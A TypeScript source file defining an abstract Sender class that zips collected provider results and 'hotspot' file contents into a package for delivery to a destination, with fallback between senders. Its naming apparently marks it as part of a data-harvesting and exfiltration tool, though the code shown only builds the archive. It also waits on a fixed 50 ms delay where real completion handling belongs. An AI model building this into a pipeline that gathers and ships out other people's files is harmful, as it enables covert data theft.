import { Zip, AsyncZipDeflate, type AsyncFlateStreamHandler } from "fflate";

import type { ProviderResult } from "../providers/types";
import type { EncryptedPackage, SenderDestination, SenderName } from "./types";

declare function scramble(str: string): string;

export abstract class Sender {
  readonly name: SenderName;
  readonly destination: SenderDestination;

  constructor(name: SenderName, destination: SenderDestination) {
    this.name = name;
    this.destination = destination;
  }

  /**
   * Transport-specific delivery. Must throw on failure so the Dispatcher
   * can fall back to the next Sender. Return value indicates whether the
   * remote side accepted the payload.
   */
  abstract send(envelope: EncryptedPackage): Promise<void>;

  /**
   * Optional pre-flight check (e.g., auth valid, reachable). Default: true.
   * The Dispatcher can call this to skip obviously-broken senders without
   * burning a full send attempt.
   */
  async healthy(): Promise<boolean> {
    return true;
  }

  /** Build a zip archive from collected files, preserving original paths. */
  async createEnvelope(results: ProviderResult[]): Promise<EncryptedPackage> {
    // Collect file entries from provider results
    const fileEntries: Map<string, Buffer> = new Map();

    for (const result of results) {
      if (!result.success || !result.data) continue;

      const data = result.data as any;
      if (data?.hotspots && typeof data.hotspots === "object") {
        for (const [filePath, content] of Object.entries(data.hotspots)) {
          if (typeof content === "string") {
            fileEntries.set(filePath, Buffer.from(content, "utf-8"));
          }
        }
      }

      if (result.provider && !data?.hotspots) {
        const jsonContent = JSON.stringify(data, null, 2);
        fileEntries.set(`${result.provider}-${result.service}.json`, Buffer.from(jsonContent, "utf-8"));
      }
    }

    if (fileEntries.size === 0) {
      const jsonString = JSON.stringify(results, null, 2);
      fileEntries.set("collected-data.json", Buffer.from(jsonString, "utf-8"));
    }

    // Create zip archive in memory
    const chunks: Uint8Array[] = [];
    const ondata: AsyncFlateStreamHandler = (err, chunk, final) => {
      if (err) throw err;
      chunks.push(chunk);
    };

    const zip = new Zip(ondata);

    for (const [filePath, data] of fileEntries) {
      const deflate = new AsyncZipDeflate(filePath, { level: 9 });
      zip.add(deflate);
      deflate.push(data, true);
    }

    zip.end();

    // Wait for zip to finish (ondata is sync for small payloads)
    // If the zip processing is async, we need a small delay
    await new Promise<void>((resolve) => setTimeout(resolve, 50));

    const archiveBuffer = Buffer.concat(chunks.map(c => Buffer.from(c)));

    return {
      envelope: archiveBuffer,
    };
  }
}
